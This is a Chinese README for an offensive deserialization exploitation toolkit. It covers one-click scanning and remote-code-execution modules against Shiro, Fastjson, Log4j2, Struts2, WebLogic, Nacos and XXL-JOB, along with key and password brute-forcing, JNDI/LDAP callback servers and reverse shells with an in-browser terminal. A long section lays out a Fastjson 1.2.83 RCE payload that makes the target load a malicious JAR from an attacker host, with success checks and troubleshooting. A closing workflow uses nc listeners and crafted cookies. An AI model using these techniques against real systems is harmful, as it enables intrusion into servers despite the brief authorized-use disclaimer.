# 反序列化漏洞工具箱

一个开箱即用的反序列化漏洞测试工具集，包含**图形化利用工具（GUI）**、**可视化 Payload 库**和**命令行扫描脚本**三部分。

> ⚠ 仅限**授权的安全测试、企业自查、靶场练习**使用，请勿对未授权目标使用。

## 文件说明

| 文件              | 说明                                                |
| --------------- | ------------------------------------------------- |
| `start-gui.bat` | **双击启动图形化利用工具**：自动探测 Python（PATH → `py -3` → 常见安装路径），起服务后开浏览器 |
| `gui_server.py` | 图形化工具的后端：真发包的扫描 / 利用 / JNDI 服务 / 反弹监听（纯标准库）       |
| `exploit.html`  | 图形化界面（由 gui_server 提供，勿单独打开）                      |
| `miniaes.py`    | 纯 Python AES-CBC 实现（Shiro 加解密用，无第三方依赖）            |
| `index.html`    | 静态可视化 Payload / 指纹库，双击用浏览器打开即可                    |
| `deserkit.py`   | 命令行脚本，真实发包的指纹识别 + Payload 生成 + 反弹 Shell 生成        |
| `selftest.py`   | 自检脚本（需先启动 gui_server）                             |
| `tools/fastj183/` | fastjson 1.2.83 模块的恶意 JAR 生成器：`GenFJ183.java` + 已编译好的 `GenFJ183.class` |
| `放行端口-管理员运行.bat` | 管理员身份放行入站端口（1389 / 8000 / 4444，或命令行指定端口）    |

---

## 〇、图形化利用工具（推荐）

```bash
# 方式1：双击 start-gui.bat
# 方式2：
python gui_server.py                # 默认 127.0.0.1:8899，自动开浏览器
python gui_server.py --host 0.0.0.0 --port 8899
python gui_server.py --port 8899 --tries 30     # 端口不可用时最多向后探测 30 个
python gui_server.py --port 8899 --strict-port  # 端口不可用就直接退出，不换端口
```

端口被占用（`WinError 10048`）或落在 Windows 保留端口区间被拒（`WinError 10013`）时会自动换下一个可用端口，**实际端口看启动横幅 / 日志 / 界面提示**，别照 8899 硬连。详见**第五节**。

顶部填一次全局参数（目标 URL / 攻击机 IP / LDAP 端口 / HTTP 端口 / 监听端口 / 超时）→ 点「应用到全部」。

| Tab          | 能做什么                                                                                                              |
| ------------ | ----------------------------------------------------------------------------------------------------------------- |
| 🎯 一键扫描      | 10 个组件并发探测，命中项高亮，给出证据 + 下一步 + **一键跳到对应利用动作**                                                                      |
| 💥 利用中心      | 左侧选动作、右侧填参数、点「执行」直接发包，输出实时展示。共 26 个动作，见下表                                                                         |
| 🌐 JNDI / 回调 | 一键起 **LDAP(1389) + HTTP(8000)** 服务，自动 javac 编译 `Exploit.class`，直接给出 `ldap://ip:1389/Exploit` 与配套 Payload；回调记录实时刷新 |
| 🐚 反弹Shell   | 生成 7 种反弹命令 → 起监听 → 会话上线后在网页里直接敲命令交互（内置终端）                                                                         |
| 📜 日志        | 所有动作与命中记录                                                                                                         |

### 26 个利用动作

| 组件         | 动作                                                                             |
| ---------- | ------------------------------------------------------------------------------ |
| Shiro      | Key 爆破（内置 30 个常见 Key）、生成 rememberMe 利用 Cookie（调 ysoserial 并直接发包）               |
| Fastjson   | 版本判定（指纹 + 资源探测回连 + 布尔三件套）、**1.2.83 无 Gadget RCE（见第三节）**、gadget 链探测、发送 Payload（1.2.24/47/68/80/83 + DNS + 自定义 JSON） |
| Log4j2     | 盲打 UA/Referer/XFF/Cookie/参数，6 种 WAF 绕过变体                                       |
| Struts2    | 编号探测、OGNL **回显**命令执行（S2-045/048/016/057/061）                                   |
| XXL-JOB    | 执行器 `/run` 未授权命令执行、默认口令登录（admin/123456）                                        |
| Nacos      | 拉取用户列表（UA 绕鉴权）、Derby RCE                                                       |
| SpringBoot | Actuator 探测、读 env 凭据、Gateway SpEL RCE                                          |
| JBoss      | CVE-2017-12149（/invoker/readonly 打序列化数据）                                       |
| Jackson    | 发送 `@class` 多态 Payload                                                         |
| XStream    | 找 XML 解析点、CVE-2021-21351 / CVE-2021-29505                                     |
| WebLogic   | **T3 协议握手探测**、弱口令爆破、任意文件读取、CVE-2018-2628 完整命令生成、探测 /wls-wsat、/\_async、/console |
| 通用         | 反弹 Shell 命令生成（含 Base64 包装）                                                     |

### 依赖说明（除 `java` 外都是可选增强，缺了也能用）

- `ysoserial.jar` 放到本目录 → Shiro / JBoss 的 gadget 可一键生成（**用 JDK 8 跑 ysoserial 最稳**）；fastjson 1.2.83 模块也借它内置的 `org.mockito.asm.*` 来生成字节码
- `java` → **fastjson 1.2.83 无 Gadget RCE 模块必需**：在本机生成恶意 JAR。缺了会直接报错
- `javac` → JNDI 服务自动编译 `Exploit.class`（已用 `--release 8` 保证老 JDK 能加载）；没有就自己放一个 `.class` 到 `_jndi/` 目录
- 目标必须能访问你的 IP，JNDI / 回调 / 反弹才有效（跨网段需端口转发）

---

## 一、index.html（可视化工具）

浏览器直接打开，六个模块：

| Tab           | 功能                                                          |
| ------------- | ----------------------------------------------------------- |
| 🎯 指纹识别       | 10 个组件的端口/路径/响应头/Cookie/报错特征 + curl / nuclei / 测绘语法命令，一键复制  |
| 🔬 版本探测       | Fastjson 布尔判定三件套、Log4j2 WAF 绕过变体、Shiro Key 字典、Struts2 编号对照等 |
| 💣 Payload 生成 | 9 个组件共 40+ 条 Payload，填入全局参数后自动生成，附配套利用命令                    |
| 🐚 反弹Shell/编码 | 8 种反弹 Shell + Base64 / URL / Unicode / Hex 编码               |
| 📋 利用流程       | 每个组件的完整利用步骤 checklist                                       |
| 🧰 工具库        | 30+ 工具按分类速查，含地址与常用命令                                        |

**用法：** 顶部填一次全局参数（目标 URL、攻击机 IP、端口、DNSLog、命令、Shiro Key）→ 点「应用参数并刷新」→ 下面所有 Payload 自动替换。

---

## 二、deserkit.py（命令行）

### 1. 指纹识别（真实发包）

```bash
# 单目标，检测全部 10 个组件
python deserkit.py scan -u http://192.168.184.162:8080

# 批量（urls.txt 每行一个 URL），16 线程，显示明细
python deserkit.py scan -f urls.txt -t 16 -v

# 只测指定组件
python deserkit.py scan -u http://192.168.184.162:8080 -c shiro,fastjson,springboot

# Log4j2 盲打验证（会向 UA/Referer/XFF 注入 dnslog payload）
python deserkit.py scan -u http://target --dnslog abc123.dnslog.cn -c log4j2

# 结果导出 JSON
python deserkit.py scan -f urls.txt -o result.json
```

可选组件：`shiro` `fastjson` `log4j2` `springboot` `jboss` `jackson` `nacos` `struts2` `xxljob` `weblogic`

### 2. Payload 生成

```bash
python deserkit.py payload -c fastjson --lhost 192.168.184.132 --lport 9988 --dnslog x.dnslog.cn --cmd "id"
python deserkit.py payload -c shiro --lhost 192.168.184.132 --jrmp 10099
python deserkit.py payload -c struts2 --cmd "whoami"
python deserkit.py payload -c xxljob --lhost 192.168.184.132 --lport 9988
```

可选：`fastjson` `log4j2` `shiro` `jboss` `struts2` `nacos` `xxljob` `springboot` `jackson`

### 3. 反弹 Shell

```bash
python deserkit.py shell --lhost 192.168.184.132 --lport 9988
```

输出 bash / bash-base64（Java Runtime.exec 专用）/ nc / mkfifo / python / php / perl / powershell 八种。

### 4. 工具库速查

```bash
python deserkit.py tools
python deserkit.py tools -c Shiro,Fastjson
```

---

## 三、Fastjson 1.2.68~1.2.83 无 Gadget RCE（`fastjson.183`，CVE-2026-16723）

在「💥 利用中心 → Fastjson → **1.2.83 无Gadget RCE**」里选。这是 fastjson 1.x 终线版本（1.2.68~1.2.83）的远程代码执行，官方已停止维护、无补丁，只能开 safeMode 或迁到 fastjson2。

### 必须同时满足的四个条件（缺一个就打不通）

1. **目标是 JDK 8。** JDK 9+ 的 JVM 拒绝含 `//` 的类名，直接 `ClassFormatError: Illegal class name`，`jar:http://` 形式根本不可用；JDK 9+ 要改用 `jar:file:/proc/self/fd/N` 两段式，本模块**未内置**。
2. **目标是 Spring Boot fat-jar**（类加载器是 `LaunchedURLClassLoader`）。普通 `AppClassLoader` 解析不了 `jar:http:` 绝对 URL，资源探测必然失败。
3. **攻击机本机装有 `java`**，用来跑 `tools/fastj183/GenFJ183.class` 生成恶意 JAR（源码 `tools/fastj183/GenFJ183.java`，字节码用 ysoserial.jar 内置的 `org.mockito.asm.*` 拼）。缺 `java` 或缺 `GenFJ183.class` 时模块直接报错退出。
4. **目标能出网访问攻击机的 `http_port`**，否则它拉不到 JAR。

### 原理

fastjson 1.2.83 的 `ParserConfig.checkAutoType` 会先把 `@type` 的值当作资源路径探测：`resource = typeName.replace('.','/') + ".class"` → `getResourceAsStream(resource)`。Spring Boot fat-jar 的 `LaunchedURLClassLoader` 能解析 `jar:http://` 绝对 URL，于是目标从攻击机的 HTTP 服务把 JAR 拉下来；字节码里只要带 `@JSONType` 注解，就被当作"可信"绕过 `expectClass` 类型匹配检查，走 `loadClass` → `defineClass` → 实例化，静态块 `<clinit>` 里的命令随即执行。

**不需要任何 gadget，也不要求开启 autoType** —— 这点和 CVE-2022-25845 那类 autoType 绕过完全不同。

载荷长这样（IP 写十进制、两个点别漏）：

```json
{"@type":"jar:http:..<十进制IP>:<端口>.<jar资源名>!.<类名>"}
```

- IP 必须转成十进制整数：点号会被 `replace('.','/')` 破坏 URL。
- `!` 后面必须跟一个点：replace 之后正好变成 jar URL 的 `!/` 分隔符。
- JAR 资源名和类名**都不能含点号**，否则模块直接拒绝执行。

### 参数怎么填

| 参数           | 含义                                     | 默认                          |
| ------------ | -------------------------------------- | --------------------------- |
| `mode`       | `cmd` 执行命令 / `shell` 反弹 shell（自动起监听）   | `cmd`                       |
| `path`       | 目标的 JSON 接口路径，留空自动找                    | `/parse`                    |
| `cmd`        | cmd 模式执行的命令                            | `touch /tmp/success_fj183`  |
| `beacon_port`| cmd 信标端口，`0` = 不用信标                    | `8000`                      |
| `lhost`      | 攻击机 IP，留空自动（按到目标的出网源 IP 推断）            | 空                           |
| `lport`      | shell 回连端口                             | `4444`                      |
| `http_port`  | 恶意 JAR 的托管端口                           | `8000`                      |
| `res`        | JAR 资源名（不含点）                           | `fjprobe`                   |
| `cls`        | 类名（不含点）                                | `Pwn`                       |
| `timeout`    | 超时（秒）                                  | `12`                        |

模块会自动做的事：拉起/复用本机 HTTP 服务托管生成的 JAR（webroot 默认 `_jndi/`）；自动探测可用的 POST JSON 接口（候选 `/parse` `/parseObject` `/json` `/api/parse` `/fastjson` `/vuln` `/`，都找不到才要求用 `path` 手动指定）；`shell` 模式会先起监听，若端口被自动顺延则用最终端口重新生成 JAR。

### 成功了看什么（别把"拉包"当"执行"）

| 现象                        | 结论                                     |
| ------------------------- | -------------------------------------- |
| 回调面板出现 `GET /FJ183-RCE`   | ✅ **RCE 成功**：恶意类静态块真的执行了               |
| 「🐚 反弹Shell」里会话上线          | ✅ **RCE 成功**（`shell` 模式）                |
| 只有 `GET /fj12345` 之类的拉包记录 | ⚠️ **只证明资源探测成功**（本质是 SSRF），**不等于 RCE** |

恶意类的静态块里恒定带一个 `http://<lhost>:<http_port>/FJ183-RCE` 信标（纯 Java `URL.openStream`，目标容器里没有 bash/curl 也能回连），它是"静态块真的跑了"的唯一可靠证据。代码里已经把"拉 JAR"和"信标/会话"分开统计，读输出时注意区分。

两个高频坑：

- **每次要换 JAR 名**。fastjson 会把加载过的类放进 `TypeUtils.mappings` 缓存，重名载荷第二次不会再触发资源探测 —— `res` / `cls` 留空让工具随机生成最省事。
- **RCE 代码必须全部内联**。静态块里不能引用 JAR 内的第二个类，目标 classpath 里没有它，`NoClassDefFoundError` 会让执行静默失败。

### 失败了怎么排查

| 现象                                        | 原因与处理                                                                                         |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| 回调面板连目标对 `/<res>` 的 GET 都没有                | 没触发资源探测：版本不在 1.2.68~1.2.83、目标开了 safeMode、或目标出网被控                                              |
| 拉了 JAR，但没 `FJ183-RCE`                      | 静态块没执行、`defineClass`/初始化失败。**最常见是目标不是 JDK 8**（回连 UA 里能看到 `Java/11` 之类）；其次是目标不是 Spring Boot fat-jar |
| `status=0 / 502 / 503 / 504` 或 upstream 字样 | 靶场容器已停或重启中，等一会儿重试                                                                              |
| 「未找到可用的 POST JSON 接口」                      | 用 `path` 手动指定真实 JSON 接口                                                                        |
| 信标有了但没弹回会话                                 | 目标无 `/bin/bash` 或出网受限，改用 `beacon_port` 做纯 HTTP 信标验证                                            |
| 报"缺少 tools/fastj183"或"未检测到 java"           | 攻击机环境问题：确认本机装了 `java`，或重新编译 `GenFJ183.java`（classpath 带 `ysoserial.jar`）                       |

---

## 四、Fastjson 版本判定（`fastjson.version`）

「💥 利用中心 → Fastjson → **版本判定**」。现在分三步，前两步是新版逻辑：

1. **读响应指纹**：POST 一次，从响应体里正则找自报版本 `fastjson=1.2.83` 之类。
2. **1.2.68~1.2.83 资源探测回连**：在本机 webroot 写一个 token 文件，发出 `jar:http:..<十进制IP>.<端口>.<token>!.V`，然后最多等 6 秒看 HTTP 回调面板有没有目标来拉这个 token。这步的 token 内容不是合法 JAR 也无所谓 —— **只要目标来拉，就证明探测点存在**（与第三节同一机制）。
3. **老布尔判定三件套**：只在 ≤1.2.47 上有意义，≥1.2.48 的结论不可靠。

参数：`path`（默认 `/parse`）、`lhost`（攻击机 IP，留空自动）、`http_port`（默认 `8000`）、`timeout`（默认 `8`）。**`lhost` 和 `http_port` 是新增的** —— 第二步的回连要靠它们，填错就收不到回调。

结论怎么读：

- 有指纹或有回连 → 版本落在 1.2.68~1.2.83，直接转**第三节**的无 Gadget RCE 模块，出网即 RCE。
- 两者都没有 → 用第三条的老规则粗判：三条都报相同错 → 多半 ≥1.2.68 且开了 safeMode；判定 1 报 syntax、判定 2/3 报 "not match" → 1.2.4x~1.2.6x；能识别 `org.XxException` → <1.2.48。注意出网受限也会造成假阴性，别只凭这一条下结论。

---

## 五、跨机器使用与权限不足排查

把工具箱拷到别的机器（尤其非管理员、Program Files 目录、公司受控环境）时，先看环境自检，再按提示处理。

### 环境自检 `/api/env`

界面里有独立的 **「🧰 环境自检」页签**（顶栏的"环境正常 / 环境风险 N"状态灯点击也能跳过去，每次进入该页签会自动重新检测），顶栏「🔧 环境自检」按钮同样会切到该页签并刷新。也可以直接浏览器打开 `http://127.0.0.1:<实际端口>/api/env`，返回：

| 字段                              | 含义                                                     |
| ------------------------------- | ------------------------------------------------------ |
| `admin` / `writable`            | 是否管理员身份 / 脚本所在目录是否可写                                   |
| `runtime_dir` / `runtime_note`  | 运行时文件实际写在哪、为什么降级                                       |
| `ports`                         | gui / ldap / http / listener 四个端口的预检结果（free / busy / self / excluded） |
| `excluded_ports`                | Windows 保留端口区间（Hyper-V / WSL / Docker 会圈走大段端口）         |
| `advice`                        | 按当前环境给出的修复建议                                           |

### 端口被占用或被系统保留 → 自动顺延

- 端口被占（`WinError 10048`）或落在 Windows 保留区间被拒（`WinError 10013`）时，自动向后探测下一个可用端口，**最多 30 个**（`--tries N` 调整）；加 `--strict-port` 则关闭顺延、端口不可用直接退出。
- 顺延后**实际端口看启动横幅、日志和界面提示**，别照 8899 硬连。

### 运行目录不可写 → 自动降级

脚本目录不可写（常见于 `C:\Program Files`、`C:` 根目录、只读 U 盘、受控目录）时，运行时文件自动改写到 **`%TEMP%\deserkit-runtime`（Windows）** 或 **`~/.deserkit`（Linux / macOS）**；两者都不行就退到临时目录（进程退出后可能丢失）。降级原因会写在 `/api/env` 的 `runtime_note` 和界面提示里。

### `放行端口-管理员运行.bat`

目标访问不到你时，多半是本机防火墙拦了入站。**右键 → 以管理员身份运行**：

```bat
放行端口-管理员运行.bat              :: 放行实际在用的端口（默认 1389,8000,4444）
放行端口-管理员运行.bat 1401 8912    :: 放行指定端口
```

不带参数时它会先问运行中的实例（`http://127.0.0.1:8899/api/env`）拿**实际在用**的端口 —— 因为端口可能已经自动顺延了；实例没起或没 Python 才退回默认列表。端口含义：`1389` = LDAP/JNDI，`8000` = HTTP codebase / 回调（也是第三节托管 JAR 的端口），`4444` = 反弹 Shell。

事后删规则：

```bat
netsh advfirewall firewall delete rule name="deserkit-lab"
```

### `start-gui.bat` 怎么找 Python

双击即可。探测顺序：PATH 上的 `python` / `python3`（要求 ≥3.8）→ Windows 启动器 `py -3` → 常见安装路径（`%LOCALAPPDATA%\Programs\Python\Python3*`、`%ProgramFiles%\Python\Python3*`、`%ProgramFiles(x86)%\Python`、`%SystemDrive%\Python`、`C:\Python`）。都没找到会给出下载链接和"把 python.exe 所在目录加进 PATH"的提示。

### 维护提醒：两个 .bat 必须 CRLF + 纯 ASCII

`start-gui.bat` 和 `放行端口-管理员运行.bat` 要保持 **CRLF 换行、且不含任何非 ASCII 字符**：cmd.exe 无法正确解析纯 LF 的多行 `for…do(…)` 块（会报 "xxx is not recognized"）；`chcp 65001` 下出现非 ASCII 字节还会造成字节错位，把 `echo` 行变成假命令。需要中文提示请在运行时用 ASCII 通配输出，**不要往这两个文件里写中文注释**；改完确认换行仍是 CRLF。

---

## 六、典型实战流程（以 Shiro 为例）

```bash
# 1. 指纹确认
python deserkit.py scan -u http://192.168.184.162:8080 -c shiro

# 2. 生成 payload 与命令序列
python deserkit.py payload -c shiro --lhost 192.168.184.132 --jrmp 10099 --lport 9988

# 3. 按输出的命令依次执行：
#    a) 攻击机起 JRMP 监听（ysoserial 需 JDK 8）
#    b) nc -lvvp 9988
#    c) python3 shiropoc.py 192.168.184.132:10099
#    d) curl 带 rememberMe Cookie 打过去
```

图形化更省事：直接用 **ShiroAttack2**（自动爆破 key + 选链 + 执行 + 内存马）。
